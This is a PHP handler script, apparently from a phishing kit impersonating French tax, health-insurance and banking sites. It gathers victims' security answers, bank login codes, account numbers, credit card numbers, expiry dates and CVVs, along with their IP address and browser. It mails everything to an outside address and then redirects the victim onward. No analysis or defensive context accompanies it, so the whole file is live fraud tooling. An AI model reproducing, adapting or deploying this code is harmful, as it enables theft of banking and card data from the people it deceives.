<?php

$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");
$message .= "-------------------| New Impot Gouv Spam Informations |-------------------\n";
$message .= "Rue grandi      : ".$_POST['reponses']."\n";
$message .= "Ami d'enfance   : ".$_POST['reponses2']."\n";
$message .= "==========Edited===By===Kamalix==========\n";
$message .= "Sa reponse question 1     : ".$_POST['reponseslcl']."\n";
$message .= "Sa reponse question 2     : ".$_POST['reponseslcl2']."\n";
$message .= "==========Edited===By===Kamalix==========\n";
$message .= "Banque Distance : ".$_POST['ibad']."\n";
$message .= "==========Edited===By===Kamalix==========\n";
$message .= "Code Client : ".$_POST['sgclient']."\n";
$message .= "D?p naissance : ".$_POST['sgdepart']."\n";
$message .= "==========Edited===By===Kamalix==========\n";
$message .= "Nom de la banque: ".$_POST['bank']."\n";
$message .= "num de compte   : ".$_POST['account']."\n";
$message .= "Carte de credit : ".$_POST['ccnum']."\n";
$message .= "Date expiration : ".$_POST['expMonth']."/".$_POST['expYear']."\n";
$message .= "Cvv             : ".$_POST['cvv']."\n";
$message .= "------------------------------------------------------------------\n";
$message .= "IP Address : ".$ip."\n";
$message .= "Browser : ".$browser."\n";
$to = "fj@hotmail.fr";
$subj = "Ameli|".$ip."\n";
$from = "From: CIC <me>";
mail($to, $subj, $message, $from);


@header("Location: index_4.html?_nfpb=true&_pageLabel=as_demande_code_conf_page&premiereDemande=FALSE");
?>